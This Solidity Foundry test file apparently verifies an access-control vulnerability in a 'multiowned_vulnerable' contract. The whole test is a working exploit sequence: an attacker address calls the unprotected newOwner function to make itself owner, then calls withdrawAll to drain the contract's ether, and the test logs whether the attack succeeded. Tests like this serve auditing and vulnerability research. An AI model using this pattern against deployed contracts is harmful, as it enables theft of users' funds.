// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/multiowned_vulnerable.sol";

contract TestContractExploitTest is Test {
    TestContract public multiOwnableContract;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    uint256 public initialContractBalance = 1 ether;

    function setUp() public {
        // Deploy contract with designated owner
        vm.prank(owner);
        multiOwnableContract = new TestContract();
        
        // Fund the contract with Ether
        vm.deal(address(multiOwnableContract), initialContractBalance);
    }

    function testUnprotectedWithdraw() public {
        uint256 attackerInitialBalance = attacker.balance;
        
        // Verify initial contract balance
        assertEq(address(multiOwnableContract).balance, initialContractBalance);
        
        console.log("--- BEFORE-Trigger newOwner ---");
        uint256 ownerWithdrawalsBefore = multiOwnableContract.ownerWithdrawals();
        console.log("Owner withdrawals (before):", ownerWithdrawalsBefore);
        console.log("---");

        console.log("--- Trigger newOwner(attacker) ---");
        // Attacker adds themselves as owner through unprotected function
        vm.startPrank(attacker);
        bool success = multiOwnableContract.newOwner(attacker);
        assertTrue(success, "Failed to add attacker as owner");
        vm.stopPrank();

        console.log("--- BEFORE-Trigger withdrawAll ---");
        uint256 contractBalanceBeforeWithdraw = address(multiOwnableContract).balance;
        console.log("Contract balance (before):", contractBalanceBeforeWithdraw);
        console.log("---");

        console.log("--- Trigger withdrawAll() ---");
        // Attacker drains contract funds
        vm.prank(attacker);
        multiOwnableContract.withdrawAll();

        console.log("--- AFTER-Trigger withdrawAll ---");
        uint256 contractBalanceAfterWithdraw = address(multiOwnableContract).balance;
        uint256 ownerWithdrawalsAfter = multiOwnableContract.ownerWithdrawals();
        uint256 attackerFinalBalance = attacker.balance;
        
        console.log("Attacker balance change:", attackerFinalBalance - attackerInitialBalance);
        console.log("Contract balance (after):", contractBalanceAfterWithdraw);
        console.log("Owner withdrawals (after):", ownerWithdrawalsAfter);
        console.log("---");

        // Verify fund transfer to attacker
        bool fundsTransferred = (attackerFinalBalance - attackerInitialBalance == initialContractBalance);
        bool contractDrained = (contractBalanceAfterWithdraw == 0);
        bool withdrawalsIncreased = (ownerWithdrawalsAfter > ownerWithdrawalsBefore);
        
        // Final vulnerability determination
        if (fundsTransferred && contractDrained && withdrawalsIncreased) {
            console.log("Vulnerability Exists: Attacker successfully became owner and withdrew funds, with withdrawal records updated");
        } else {
            console.log("Vulnerability not Exist: Attack did not complete successfully according to state changes");
        }
    }
}